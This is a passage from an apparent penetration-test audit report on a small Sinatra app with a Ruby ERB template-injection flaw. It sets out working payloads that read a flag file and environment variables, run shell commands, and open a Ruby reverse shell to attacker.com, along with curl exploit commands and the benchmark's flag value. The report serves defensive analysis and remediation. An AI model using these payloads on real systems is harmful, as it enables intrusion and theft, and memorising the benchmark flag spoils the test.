- **Visibility:** `docker history` command reveals ARG values and RUN commands
- **Persistence:** Flag value embedded in image metadata and intermediate layers

**Security Implications:** The flag's presence at multiple locations with varying security postures creates numerous exploitation paths. The SSTI vulnerability enables direct access to both the filesystem (`File.read('/app/flag.txt')`) and environment variables (`ENV['FLAG']`). Git repository exposure means anyone with read access to the repository (including historical commits) can retrieve flag values. Docker image inspection reveals the flag through `docker inspect` and `docker history` commands. The lack of encryption means the flag is stored and transmitted in plaintext across all these mediums.

### Encryption Implementation

**Critical Finding: COMPLETE ABSENCE OF ENCRYPTION**

The application has **zero encryption mechanisms** across all categories:

**Data at Rest:** No encryption for the flag file (`/app/flag.txt`), no filesystem-level encryption, no volume encryption, and no encrypted environment variable storage. The flag exists in plaintext on the container filesystem and host filesystem.

**Data in Transit:** No TLS/SSL configuration, HTTP-only communication on port 4567 (line 3: `set :bind, '0.0.0.0'`), no certificate management, and no HTTPS enforcement. All network traffic is transmitted in plaintext, making it vulnerable to interception, man-in-the-middle attacks, and network eavesdropping.

**Cryptographic Libraries:** No encryption gems in `Gemfile` (no bcrypt for password hashing, no argon2 for key derivation, no openssl wrappers for encryption operations, no jwt gem for token signing). The application has no capability to perform cryptographic operations.

**Key Management:** No key storage mechanism, no key rotation policies, no hardware security module (HSM) integration, and no secrets management service integration (Vault, AWS Secrets Manager, Azure Key Vault).

**Security Implications:** The complete absence of encryption creates severe confidentiality risks. Network traffic containing flag data or exploitation payloads is fully readable by anyone with network access (MITM attackers, network administrators, ISPs). The flag stored on disk is accessible to anyone with filesystem access, including other container users, host system users with Docker access, or attackers who achieve container escape. The lack of TLS also enables downgrade attacks and prevents the use of secure cookie flags, HSTS headers, or certificate-based authentication.

**Recommendations:**

1. **Implement TLS:** Deploy behind a reverse proxy (nginx, Caddy) with TLS termination using Let's Encrypt certificates, or configure Puma with SSL support directly in production environments.

2. **Encrypt Flag Storage:** Use Ruby's OpenSSL library to encrypt the flag file:
```ruby
require 'openssl'
cipher = OpenSSL::Cipher.new('AES-256-CBC')
cipher.encrypt
key = ENV['ENCRYPTION_KEY']  # Store key separately
iv = cipher.random_iv
encrypted_flag = cipher.update(flag) + cipher.final
```

3. **Use Secrets Management:** Integrate with HashiCorp Vault, AWS Secrets Manager, or similar services to store and retrieve secrets at runtime rather than embedding them in files or environment variables.

4. **Enforce HTTPS:** Implement HTTPS redirects and HSTS headers to prevent protocol downgrade attacks.

---

## 5. Attack Surface Analysis

### External Entry Points

The application exposes **two network-accessible HTTP endpoints**, both publicly accessible without authentication. All entry points have been verified to meet the in-scope criteria as they are invoked through the Sinatra web server's network interface binding to `0.0.0.0:4567`.

#### Entry Point 1: GET / (Index Page)

**File:** `/app/app.rb`  
**Lines:** 5-7  
**HTTP Method:** GET  
**Route:** `/`  
**Authentication:** None required (public endpoint)  
**Authorization:** None required  
**Request Format:** Standard HTTP GET request (no body)  
**Response Format:** HTML (ERB template rendering)  
**Content-Type:** text/html

**Functionality:** Serves the main application index page containing an HTML form for text generation. The template is defined inline within `app/app.rb` at lines 21-100 (ERB block `__END__` section, `:index` template). The page includes Bootstrap 4.5.2 CSS for styling, jQuery 3.5.1 for client-side validation, and a form with two input fields (`sentence` text input and `number` numeric input) submitting to the `/generate` endpoint.

**Input Validation:** None required (GET request with no parameters). The endpoint does not process user input; it simply renders a static template.

**Attack Surface Assessment:** This endpoint has **minimal direct attack surface**. It is read-only with no user input processing, no database queries, no file operations based on user data, and no template injection vulnerabilities in the static page content. However, it serves as the **entry point for reconnaissance**, revealing:
- Application technology stack (Sinatra, Ruby) through HTTP headers
- Form structure and expected parameters for the `/generate` endpoint
- Client-side validation logic (JavaScript at lines 81-96)
- Application purpose and functionality

**Security Considerations:**
- No sensitive data is rendered on this page
- The page source reveals client-side validation patterns that attackers will bypass
- HTTP response headers may leak framework information (X-Powered-By, Server headers)
- No rate limiting on page requests could enable reconnaissance at scale

**Code Reference:**
```ruby
get '/' do
  erb :index
end
```

---

#### Entry Point 2: POST /generate (Text Generation - CRITICAL VULNERABILITY)

**File:** `/app/app.rb`  
**Lines:** 9-19  
**HTTP Method:** POST  
**Route:** `/generate`  
**Authentication:** None required (public endpoint)  
**Authorization:** None required  
**Request Format:** application/x-www-form-urlencoded (HTML form submission)  
**Response Format:** HTML (ERB template rendering)  
**Content-Type:** text/html

**Functionality:** Accepts user input to generate repeated text output. The endpoint receives two parameters: `sentence` (string to be repeated) and `number` (integer count of repetitions). The implementation creates an ERB template from the user-supplied sentence and evaluates it `number` times, storing results in the `@output` array. The results are rendered using the `:result` ERB template (lines 102-157).

**Input Parameters:**

1. **sentence (string):**
   - **Source:** `params[:sentence]` (line 10)
   - **Server-Side Validation:** **NONE**
   - **Client-Side Validation:** Regex `/^[a-zA-Z0-9\s]+$/` (alphanumeric and spaces only, line 91)
   - **Expected Use:** Text string to be repeated
   - **Actual Behavior:** Directly interpolated into ERB template constructor (**CRITICAL VULNERABILITY**)

2. **number (integer):**
   - **Source:** `params[:number].to_i` (line 11)
   - **Server-Side Validation:** **NONE** (no bounds checking)
   - **Client-Side Validation:** Maximum value 200 (line 83-86)
   - **Expected Use:** Number of times to repeat the sentence
   - **Actual Behavior:** Used as loop boundary without server-side limits (**DoS RISK**)

**Critical Vulnerability Analysis:**

**VULNERABILITY: Server-Side Template Injection (SSTI) → Remote Code Execution (RCE)**

**Location:** Lines 14-15

**Vulnerable Code:**
```ruby
template = ERB.new("#{sentence}")  # Line 14: User input directly in constructor
template.result(binding)           # Line 15: Execute with full Ruby binding context
```

**Vulnerability Details:** The application constructs an ERB template using string interpolation with untrusted user input (`"#{sentence}"`), then evaluates the template with the `binding` parameter, which provides **full access to the Ruby execution context**. This includes:
- All environment variables (`ENV` hash)
- File system operations (`File.read`, `File.write`, `Dir.entries`)
- System command execution (backticks, `system()`, `exec()`, `spawn()`)
- Network operations (`Net::HTTP`, `TCPSocket`)
- Ruby introspection (`ObjectSpace`, `eval`)
- Process manipulation (`fork`, `exit`, `abort`)

**Exploitability:** **CRITICAL - Remotely exploitable by unauthenticated attackers**

The client-side JavaScript validation at lines 88-92 can be trivially bypassed through:
- Direct POST requests using curl, wget, or Python requests library
- Browser developer tools (disable JavaScript, modify validation function)
- Proxy interception tools (Burp Suite, OWASP ZAP, mitmproxy)
- Custom HTTP clients ignoring client-side validation entirely

**Attack Payloads:**

Flag exfiltration (filesystem):
```
POST /generate HTTP/1.1
Content-Type: application/x-www-form-urlencoded

sentence=<%= File.read('/app/flag.txt') %>&number=1
```

Flag exfiltration (environment):
```
sentence=<%= ENV['FLAG'] %>&number=1
```

Directory listing:
```
sentence=<%= Dir.entries('/app').join(', ') %>&number=1
```

System command execution:
```
sentence=<%= `whoami` %>&number=1
sentence=<%= `cat /etc/passwd` %>&number=1
```

Reverse shell (using Ruby):
```
sentence=<%= require 'socket'; s=TCPSocket.new('attacker.com',4444); exec('/bin/bash -i <&3 >&3 2>&3') %>&number=1
```

Environment enumeration:
```
sentence=<%= ENV.to_h %>&number=1
```

**Code Reference:**
```ruby
post '/generate' do 
  sentence = params[:sentence]
  number = params[:number].to_i

  @output = (1..number).map do
    template = ERB.new("#{sentence}")
    template.result(binding)
  end
  @number = number
  erb :result
end
```

**Impact Assessment:**
- **Confidentiality:** CRITICAL - Full file system read access, environment variable access, flag exfiltration
- **Integrity:** CRITICAL - File system write access, application code modification, system configuration changes
- **Availability:** CRITICAL - Process termination, resource exhaustion, container crash

**CVSS 3.1 Score:** 10.0 (Critical)  
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Changed (S:C) - Container escape possible
- Confidentiality: High (C:H)
- Integrity: High (I:H)
- Availability: High (A:H)

---

### Internal Service Communication

**Finding: NO INTERNAL SERVICE COMMUNICATION**

The application operates as a self-contained monolith with **no service-to-service communication**. There are no microservices, no message queues, no gRPC services, no REST API calls to other services, and no inter-process communication mechanisms. The architecture consists of a single Ruby process running within a Docker container with no external service dependencies beyond the basic container runtime.

**Trust Relationships:** None exist beyond the implicit trust boundary at the network interface. The application does not communicate with databases, caching layers (Redis, memcached), authentication services, API gateways, or other backend services. The stateless architecture means each request is processed independently without relying on shared state or external service calls.

**Security Implications:** The absence of internal service communication eliminates several attack vectors:
- No lateral movement opportunities to other services
- No service-to-service authentication tokens to steal or forge
- No microservice authorization bypass vulnerabilities
- No API gateway misconfigurations to exploit
- No message queue injection or deserialization attacks

However, if internal services were added in the future, critical security considerations would include:
- Service mesh authentication (mTLS with certificate validation)
- Service-to-service authorization (JWT with appropriate scopes)
- Network segmentation enforced at the infrastructure layer
- Encrypted service communication even within the internal network
- Input validation at service boundaries (defense in depth)
- Distributed tracing for security monitoring and incident response

---

### Input Validation Patterns

**Critical Finding: NO SERVER-SIDE INPUT VALIDATION**

The application demonstrates a **catastrophic failure in input validation** by relying exclusively on client-side JavaScript validation that is trivially bypassable. The validation architecture is:

**Client-Side Validation (BYPASSABLE):**

**File:** `/app/app.rb`  
**Lines:** 81-96

```javascript
<script>
  $(document).ready(function(){
    $("form").submit(function(){
      if($("#number").val() > 200){
        alert("Number of times to repeat should be less than 200");
        return false;
      }

      var regex = /^[a-zA-Z0-9\s]+$/;

      if(!regex.test($("#sentence").val())){
        alert("Invalid input format");
        return false;
      }
    });
  });
</script>
```

**Validation Rules (Client-Side Only):**
1. `number` parameter must be ≤ 200
2. `sentence` parameter must match regex `/^[a-zA-Z0-9\s]+$/` (alphanumeric characters and spaces only)

**Server-Side Validation (ABSENT):**

**File:** `/app/app.rb`  
**Lines:** 10-11

```ruby
sentence = params[:sentence]      # Line 10: NO VALIDATION
number = params[:number].to_i     # Line 11: Only type conversion, no bounds checking
```

The server performs **zero validation**:
- No regex check on `sentence` content
- No length limits on `sentence` (could be megabytes of data)
- No bounds checking on `number` (could be negative, zero, or extremely large)
- No type validation (accepts any data coercible to integer via `.to_i`)
- No sanitization before template processing
- No character allowlist or blocklist enforcement
- No rate limiting per IP or session

**Bypass Techniques:**

1. **Direct POST Request (curl):**
```bash
curl -X POST http://target:4567/generate \
  -d "sentence=<%= system('whoami') %>&number=1"
```

2. **Browser DevTools:**
```javascript
// In browser console before form submission:
document.querySelector('form').onsubmit = () => true;
// Or simply disable JavaScript entirely
```

3. **Proxy Interception (Burp Suite):**
```
POST /generate HTTP/1.1
Host: target:4567
Content-Type: application/x-www-form-urlencoded

sentence=<%= File.read('/app/flag.txt') %>&number=1
```

4. **Python Requests:**
```python
import requests
payload = {"sentence": "<%= ENV['FLAG'] %>", "number": "1"}
response = requests.post("http://target:4567/generate", data=payload)
```

**Security Implications:**

The lack of server-side validation enables:
- **SSTI/RCE:** Template injection payloads pass through unchecked
- **Resource Exhaustion:** `number=999999999` creates massive arrays
- **Data Exfiltration:** No length limits allow exfiltrating large files
- **XSS:** No output encoding combined with no input validation
- **DoS:** Arbitrarily large inputs consume memory and CPU

**Proper Input Validation Implementation:**

```ruby
post '/generate' do
  # Validate presence
  halt 400, "Missing required parameters" unless params[:sentence] && params[:number]
  
  sentence = params[:sentence].to_s
  number = params[:number].to_i
  
  # Validate sentence content
  halt 400, "Invalid characters in sentence" unless sentence.match?(/\A[a-zA-Z0-9\s]+\z/)
  
  # Validate sentence length
  halt 400, "Sentence too long" if sentence.length > 200
  
  # Validate number bounds
  halt 400, "Number must be between 1 and 200" unless (1..200).include?(number)
  
  # Safe processing (without ERB template injection)
  @output = [sentence] * number
  @number = number
  erb :result
end
```

---

### Background Processing

**Finding: NO BACKGROUND PROCESSING**

The application does not implement any background job processing. There are no asynchronous workers, no job queues (Sidekiq, Resque, Delayed::Job), no scheduled tasks (cron jobs, Rufus scheduler), and no webhook processing systems. All request processing occurs synchronously within the HTTP request/response cycle of the Puma web server.

**Privilege Model:** Not applicable, as no background jobs exist.

**Security Implications:** The synchronous architecture eliminates background job-related attack vectors such as job queue injection, deserialization vulnerabilities in job arguments, privilege escalation via worker processes, or time-of-check-to-time-of-use (TOCTOU) vulnerabilities in async processing. However, the synchronous model also means:
- Long-running operations block HTTP worker threads
- Resource exhaustion via the `number` parameter (creating large arrays) directly impacts web server responsiveness
- No isolation between request processing and potentially dangerous operations (SSTI execution happens in web worker context)

If background processing were added, security considerations would include:
- Input validation of job arguments before queueing
- Separate privilege contexts for web and worker processes
- Queue authentication to prevent unauthorized job injection
- Timeout mechanisms to prevent indefinite job execution
- Monitoring for job failures indicating attack attempts

---

### Network Configuration

**File:** `/app/app.rb`  
**Line:** 3

```ruby
set :bind, '0.0.0.0'
```

**Docker Configuration:**  
**File:** `docker-compose.yml`  
**Lines:** 6-7

```yaml
ports:
  - "4567:4567"
```

**Network Binding Analysis:** The application binds to `0.0.0.0` (IPv4 wildcard address), making it accessible on **all network interfaces** of the host system. In a Docker environment, this means the service accepts connections from:
- The host machine
- Other containers on the same Docker network
- External networks if the Docker port mapping (`4567:4567`) exposes the port to the host's network interfaces

**Security Implications:** Binding to all interfaces increases the attack surface by making the service accessible from any network the host is connected to, including potentially untrusted networks. For a production deployment, best practices would include:
- Binding to `127.0.0.1` for local-only access
- Using Docker networks for container-to-container communication without host exposure
- Deploying behind a reverse proxy (nginx, Traefik) that handles TLS termination and provides additional security controls
- Implementing network policies or firewall rules to restrict access to specific IP ranges

---

## 6. Infrastructure & Operational Security

### Secrets Management

**Critical Finding: INSECURE SECRET STORAGE AND DISTRIBUTION**

The application's secrets management practices demonstrate **multiple critical security failures** across the entire secret lifecycle:

**Secret Storage Locations:**

1. **Plaintext .env File (Committed to Git):**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/.env`
   - **Line:** 1
   - **Content:** `FLAG="flag{c4ddca47-533e-432a-b5fa-1503c21c538c}"`
   - **Permissions:** 644 (world-readable)
   - **Git Status:** Tracked in repository (visible in `git log --all --full-history -- .env`)
   - **Risk:** Permanent exposure in git history, accessible to anyone with repository access

2. **Container Filesystem:**
   - **File:** `/app/flag.txt` (inside Docker container)
   - **Created By:** Dockerfile line 13: `RUN echo $FLAG > /app/flag.txt`
   - **Permissions:** Likely 644 (no explicit chmod in Dockerfile)
   - **Accessibility:** Direct file read via SSTI: `<%= File.read('/app/flag.txt') %>`

3. **Docker Build Arguments (Image Metadata):**
   - **File:** `app/Dockerfile`
   - **Line:** 10
   - **Code:** `ARG FLAG`
   - **Risk:** Build arguments are **permanently stored** in Docker image metadata
   - **Exploitation:** `docker history <image_id>` reveals ARG values in image layers
   - **Visibility:** Anyone with access to the Docker image can extract the flag

4. **Environment Variables:**
   - **File:** `app/Dockerfile`
   - **Line:** 11
   - **Code:** `ENV FLAG=${FLAG}`
   - **Risk:** Environment variables visible to process inspection, child processes, and error messages
   - **Exploitation:** SSTI access via `<%= ENV['FLAG'] %>` or `docker inspect <container_id>`
   - **Inheritance:** All child processes inherit the FLAG environment variable

**Insecure Dockerfile Secret Handling:**

**File:** `app/Dockerfile`  
**Lines:** 10-13

```dockerfile
ARG FLAG                           # Line 10: Build-time argument (stored in metadata)
ENV FLAG=${FLAG}                   # Line 11: Runtime environment variable (visible)
                                   # Line 12: (blank)
RUN echo $FLAG > /app/flag.txt     # Line 13: Flag embedded in image layer
```

**Security Issues:**
- **ARG Persistence:** Docker build arguments are stored in image metadata and visible via `docker history`
- **ENV Exposure:** Environment variables are included in `docker inspect` output and inherited by all processes
- **RUN Command Logging:** The `RUN echo $FLAG` command with its output is stored in the image layer and visible in docker history
- **No Secrets API:** Docker provides a secrets mechanism (Docker Swarm secrets, BuildKit secret mounts) that is not used
- **Layer Caching:** Flag value may be cached in intermediate Docker layers

**Demonstration of Exposure:**
```bash
# Flag visible in image history
docker history xben-086-24-app:latest
# Output shows: RUN /bin/sh -c echo $FLAG > /app/flag.txt

# Flag visible in container environment
docker inspect <container_id> | grep FLAG
# Output: "FLAG=flag{...}"
```

**Recommended Secure Dockerfile Pattern:**

```dockerfile
# Use BuildKit secret mount (not ARG)
# syntax=docker/dockerfile:1.2

FROM ruby:3.1.2

WORKDIR /app
COPY Gemfile Gemfile.lock ./
RUN bundle install
COPY app.rb ./

# Mount secret at build time only (not stored in image)
RUN --mount=type=secret,id=flag \
    cat /run/secrets/flag > /app/flag.txt && \
    chmod 600 /app/flag.txt

# Build command: docker buildx build --secret id=flag,src=.env .
```

**Secret Rotation:**

**Finding: NO SECRET ROTATION MECHANISM**

The application has:
- No secret versioning system
- No support for multiple valid secrets during rotation
- No expiration timestamps on secrets
- No automated rotation scripts or processes
- No audit trail of secret access or rotation events
- Hardcoded secret values without dynamic refresh capability

**Security Implications:** Once the flag is compromised (e.g., via git repository access, Docker image inspection, or SSTI exploitation), there is no mechanism to rotate it without rebuilding the entire Docker image and restarting all containers. This means compromise detection leads to lengthy remediation processes.

**Recommendations:**

1. **Immediate Actions:**
   - Remove `.env` and `app/flag.txt` from git repository: `git rm --cached .env app/flag.txt`
   - Add to `.gitignore` to prevent future commits
   - Purge git history: `git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch .env app/flag.txt' --prune-empty --tag-name-filter cat -- --all`
   - Rotate all exposed secrets (consider them compromised)

2. **Docker Secret Management:**
   - Use Docker Swarm secrets or Kubernetes secrets for container orchestration
   - Use BuildKit secret mounts for build-time secrets (`--mount=type=secret`)
   - Never use `ARG` for sensitive data (use `ENV` at runtime only, sourced from secure storage)
   - Remove `RUN echo $FLAG` pattern (never log secrets in build commands)

3. **Runtime Secret Retrieval:**
   - Fetch secrets from Vault, AWS Secrets Manager, Azure Key Vault, or Google Secret Manager at application startup
   - Store secrets in memory only, never write to filesystem
   - Implement secret refresh mechanism for rotation support

4. **File System Security:**
   - Set restrictive permissions: `chmod 600` on secret files
   - Use separate user account: Add `USER appuser` directive to Dockerfile
   - Mount secrets as read-only volumes in production

5. **Monitoring and Audit:**
   - Log secret access attempts (without logging secret values)
   - Alert on unusual secret access patterns
   - Implement secret rotation schedules (30-90 days)
   - Track secret versions for rollback capability

---

### Configuration Security

**Critical Finding: NO ENVIRONMENT SEPARATION**

The application demonstrates a **complete lack of environment separation** between development, staging, and production configurations:

**Single Configuration File:** The application uses a single configuration approach defined in `app/app.rb:3` (`set :bind, '0.0.0.0'`) with no environment-specific overrides. There are no separate configuration files for development vs production (no `config/environments/` directory, no environment detection logic), no feature flags to enable/disable functionality per environment, and no separate secret sets per environment.

**Shared Secrets:** The `.env` file contains development secrets that would also be used in production if this were a real application. The flag value `flag{c4ddca47-533e-432a-b5fa-1503c21c538c}` in the `.env` file would be the same across all environments unless manually changed, violating the principle that production secrets should be unique and never used in development or testing.

**Security Implications:** Using the same configuration and secrets across environments means:
- Development environment compromises expose production secrets
- Testing activities could accidentally affect production data (if databases existed)
- Debug logging enabled in development might be enabled in production
- Loose security controls in development (e.g., no TLS) carry over to production
- Developers with development access have production secret knowledge

**Recommendations:**

1. **Environment Detection:**
```ruby
configure :development do
  set :bind, '127.0.0.1'  # Local only
  set :show_exceptions, true
end

configure :production do
  set :bind, '0.0.0.0'  # All interfaces (behind reverse proxy)
  set :show_exceptions, false
  # Load production secrets from Vault/AWS Secrets Manager
end
```

2. **Separate Secret Management:**
   - Development: Use `.env.development` with non-sensitive placeholder values
   - Staging: Use `.env.staging` with staging-specific secrets
   - Production: Use secrets management service (Vault, AWS Secrets Manager)
   - Never commit production secrets to version control

3. **Infrastructure as Code:**
   - Separate Dockerfiles: `Dockerfile.dev`, `Dockerfile.prod`
   - Separate docker-compose files: `docker-compose.dev.yml`, `docker-compose.prod.yml`
   - Use different base images (development may include debugging tools)

---

### Security Headers

**Critical Finding: NO SECURITY HEADERS CONFIGURED**

The application implements **zero custom security headers** beyond default web server responses. No HTTP security headers are configured in `app/app.rb`, and no middleware is present to inject security headers into responses.

**Missing Critical Security Headers:**

**File:** `app/app.rb` (header configuration absent)  
**Location:** No `before` filter or header configuration block exists

The application should implement the following headers but does not:

1. **Content-Security-Policy (CSP):** Not configured
   - **Purpose:** Mitigate XSS by restricting resource loading sources
   - **Recommended Value:** `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;`
   - **Current State:** Absent, allowing inline scripts and any external resource loading

2. **X-Frame-Options:** Not configured
   - **Purpose:** Prevent clickjacking attacks
   - **Recommended Value:** `DENY` or `SAMEORIGIN`
   - **Current State:** Absent, allowing the page to be embedded in frames

3. **X-Content-Type-Options:** Not configured
   - **Purpose:** Prevent MIME-sniffing attacks
   - **Recommended Value:** `nosniff`
   - **Current State:** Absent, allowing browsers to MIME-sniff responses

4. **X-XSS-Protection:** Not configured
   - **Purpose:** Enable browser XSS filters (legacy browsers)
   - **Recommended Value:** `1; mode=block`
   - **Current State:** Absent (though this header is deprecated in favor of CSP)

5. **Strict-Transport-Security (HSTS):** Not configured (**CRITICAL - Infrastructure Level**)
   - **Purpose:** Force HTTPS connections, prevent protocol downgrade
   - **Recommended Value:** `max-age=31536000; includeSubDomains; preload`
   - **Current State:** Absent, application serves HTTP only
   - **Location to Configure:** Infrastructure layer (nginx, CDN, Kubernetes Ingress)
   - **Files to Check:** None found - no nginx.conf, no Kubernetes manifests with Ingress configuration, no CDN settings

6. **Referrer-Policy:** Not configured
   - **Purpose:** Control referrer information leakage
   - **Recommended Value:** `no-referrer` or `strict-origin-when-cross-origin`
   - **Current State:** Absent, full URL sent as referrer

7. **Permissions-Policy:** Not configured
   - **Purpose:** Control browser feature access
   - **Recommended Value:** `geolocation=(), microphone=(), camera=()`
   - **Current State:** Absent, all features available to page

**Infrastructure Security Headers Analysis:**

**Finding: NO INFRASTRUCTURE-LEVEL SECURITY CONFIGURATIONS FOUND**

A search for infrastructure configuration files that would typically define security headers like HSTS and Cache-Control revealed:

- **No nginx configuration:** No `nginx.conf`, `nginx/`, or reverse proxy configurations found
- **No Kubernetes resources:** No `ingress.yaml`, `gateway.yaml`, or service mesh configurations
- **No CDN settings:** No Cloudflare, AWS CloudFront, or other CDN configurations
- **No API Gateway:** No Kong, Traefik, or other API gateway configurations

The application runs directly via Puma web server without an infrastructure layer that would typically handle security headers, TLS termination, or caching policies. This means:
- HSTS headers cannot be set (requires HTTPS, which isn't configured)
- No reverse proxy layer for defense-in-depth
- Cache-Control headers not configured at infrastructure level
- No Web Application Firewall (WAF) in front of the application

**Rack::Protection Analysis:**

While the application includes `rack-protection 3.2.0` as a dependency (from Sinatra), its default protections are limited to:
- Basic CSRF protection (via HTTP header validation)
- Session hijacking protection (requires sessions, not applicable here)
- IP spoofing protection

Rack::Protection does **not** automatically add the security headers listed above. Those must be explicitly configured.

**Security Implications:**

- **XSS Exploitation:** No CSP allows injected JavaScript to execute freely
- **Clickjacking:** No X-Frame-Options allows embedding in malicious iframes
- **MIME Confusion:** No X-Content-Type-Options allows MIME-sniffing attacks
- **Protocol Downgrade:** No HSTS allows MITM attacks to downgrade HTTPS to HTTP
- **Information Leakage:** No Referrer-Policy leaks full URLs in Referer header

**Recommended Implementation:**

```ruby
# Add to app/app.rb after 'require' statements
before do
  # Content Security Policy
  headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"
  
  # Clickjacking protection
  headers['X-Frame-Options'] = 'DENY'
  
  # MIME-sniffing protection
  headers['X-Content-Type-Options'] = 'nosniff'
  
  # XSS filter (legacy browser support)
  headers['X-XSS-Protection'] = '1; mode=block'
  
  # Referrer policy
  headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
  
  # Feature policy
  headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
  
  # HSTS (only if serving over HTTPS)
  # headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains' if request.secure?
end
```

---

### External Dependencies

**Finding: MINIMAL DEPENDENCY FOOTPRINT**

The application has a **deliberately minimal dependency tree**, reducing the dependency attack surface but also eliminating security-focused libraries:

**Direct Dependencies:**

**File:** `app/Gemfile`  
**Lines:** 3-4

```ruby
gem 'sinatra'  # Web framework
gem 'puma'     # Web server
```

**Transitive Dependencies (from Gemfile.lock):**

**File:** `app/Gemfile.lock`  
**Lines:** 7-18

```
base64 (0.2.0)
mustermann (3.0.0)
  ruby2_keywords (~> 0.0.1)
nio4r (2.7.3)
puma (6.4.2)
  nio4r (~> 2.0)
rack (2.2.9)
rack-protection (3.2.0)
  base64 (>= 0.1.0)
  rack (~> 2.2, >= 2.2.4)
ruby2_keywords (0.0.5)
sinatra (3.2.0)
  mustermann (~> 3.0)
  rack (~> 2.2, >= 2.2.4)
  rack-protection (= 3.2.0)
  tilt (~> 2.0)
tilt (2.3.0)
```

**Dependency Security Analysis:**

1. **Sinatra 3.2.0:** Current version (released 2024), no known CVEs
2. **Puma 6.4.2:** Current version (released 2024), no known CVEs  
3. **Rack 2.2.9:** **OUTDATED AND VULNERABLE**
   - Current branch is Rack 3.x
   - Known CVEs:
     - **CVE-2024-26146:** HTTP header injection vulnerability
     - **CVE-2024-25126:** ReDoS (Regular Expression Denial of Service)
   - **Recommendation:** Upgrade to Rack 3.x (requires checking Sinatra compatibility)

4. **rack-protection 3.2.0:** Current version, provides basic security middleware
5. **mustermann 3.0.0:** Current version (routing pattern matching)
6. **tilt 2.3.0:** Template interface abstraction library
7. **nio4r 2.7.3:** Non-blocking I/O library for Puma

**Missing Security Dependencies:**

The application lacks security-focused gems that would provide defense-in-depth:
- **rack-attack:** Rate limiting and throttling
- **secure_headers:** Automated security header configuration
- **brakeman:** Static analysis security scanner (development)
- **bundler-audit:** Checks for vulnerable dependency versions
- **bcrypt:** Password hashing (not needed, no authentication exists)

**Third-Party Service Integrations:**

**Finding: NO EXTERNAL SERVICE INTEGRATIONS**

The application makes **zero external service calls**. No third-party integrations detected:
- No payment processors (Stripe, PayPal)
- No authentication providers (Auth0, Okta, OAuth)
- No cloud services (AWS SDK, GCP client libraries)
- No monitoring services (Datadog, New Relic)
- No email services (SendGrid, Mailgun)
- No analytics (Google Analytics, Mixpanel)

**Security Implications:** The lack of external dependencies reduces third-party risk but also means:
- No supply chain attack surface from third-party services
- No API key leakage risks to external services
- No SSRF attack surface from webhook callbacks
- However, also no security monitoring or alerting capabilities
- No centralized logging for security event analysis

**Recommendations:**

1. **Dependency Management:**
   - Upgrade Rack to 3.x: Update Gemfile to specify `gem 'rack', '~> 3.0'` and test compatibility
   - Add bundler-audit: `gem 'bundler-audit', require: false, group: :development`
   - Run `bundle audit` regularly to check for known vulnerabilities

2. **Security Gems:**
   - Add rack-attack for rate limiting: `gem 'rack-attack'`
   - Add secure_headers for automatic security header configuration: `gem 'secure_headers'`

3. **Monitoring:**
   - Integrate application monitoring (New Relic, Datadog) for production deployments
   - Add centralized logging (Splunk, ELK stack) for security event analysis
   - Implement error tracking (Sentry, Rollbar) to catch exploitation attempts

---

### Monitoring & Logging

**Critical Finding: NO APPLICATION LOGGING OR MONITORING**

The application implements **zero logging beyond default web server access logs**. No custom logging, security event monitoring, or observability tooling is present.

**Logging Status:**

**File:** `app/app.rb` (no logging configuration found)  
**Evidence:** No `require 'logger'`, no Logger instantiation, no log statements in route handlers

The application has:
- **No application logging:** No Logger configuration, no log file output
- **No security event logging:** No logs for validation failures, suspicious input, or attack attempts
- **No audit trail:** No record of requests, responses, or operations performed
- **No error logging:** No custom error handlers or error logging (relies on Sinatra defaults)
- **No structured logging:** No JSON-formatted logs for parsing by SIEM systems

**Default Puma Access Logs:**

The only logging present is Puma's default access logs to stdout/stderr, which include:
- HTTP method and path
- Response status code
- Response time
- Timestamp

However, these logs **do not include:**
- Request parameters or body content
- Response body content
- User IP addresses (unless Puma configured to log them)
- Attack attempt indicators (SSTI payloads, XSS attempts)
- Error stack traces with context

**Security Implications:**

Without logging, the application cannot:
- Detect ongoing attacks (SSTI attempts, XSS probes, enumeration)
- Perform incident response or forensic analysis after compromise
- Correlate attack patterns across multiple requests
- Alert on suspicious behavior or anomalies
- Comply with security logging requirements (PCI-DSS, SOC 2, HIPAA if applicable)
- Implement rate limiting based on behavior patterns

**Example Undetectable Attacks:**

```bash
# SSTI exploitation - no log of malicious payload
curl -X POST http://target:4567/generate -d "sentence=<%= File.read('/etc/passwd') %>&number=1"

# Flag exfiltration - no audit trail
curl -X POST http://target:4567/generate -d "sentence=<%= ENV['FLAG'] %>&number=1"

# Reconnaissance - no detection of enumeration
for i in {1..1000}; do curl http://target:4567/; done
```

None of these attacks would generate security alerts or detailed logs for forensic analysis.

**Recommended Logging Implementation:**

```ruby
require 'logger'
require 'json'

configure do
  # Create logger
  set :logger, Logger.new('log/app.log', 'daily')
  logger.level = Logger::INFO
  logger.formatter = proc do |severity, datetime, progname, msg|
    {
      timestamp: datetime.iso8601,
      severity: severity,
      message: msg,
      app: 'xben-086-24'
    }.to_json + "\n"
  end
end

before do
  # Log all requests
  logger.info({
    event: 'request',
    method: request.request_method,
    path: request.path,
    ip: request.ip,
    user_agent: request.user_agent,
    params: params.inspect  # Be careful with sensitive data
  })
end

post '/generate' do
  sentence = params[:sentence]
  number = params[:number].to_i
  
  # Detect and log potential SSTI attempts
  if sentence =~ /<%=?|%>|\#\{|\}\|/
    logger.warn({
      event: 'ssti_attempt',
      ip: request.ip,
      payload: sentence,
      timestamp: Time.now.iso8601
    })
  end
  
  # Detect and log excessive number parameter
  if number > 200
    logger.warn({
      event: 'dos_attempt',
      ip: request.ip,
      number: number,
      timestamp: Time.now.iso8601
    })
  end
  
  # Rest of code...
end

error do
  # Log all errors with context
  logger.error({
    event: 'error',
    error: env['sinatra.error'].class.name,
    message: env['sinatra.error'].message,
    backtrace: env['sinatra.error'].backtrace[0..5],
    request: {
      method: request.request_method,
      path: request.path,
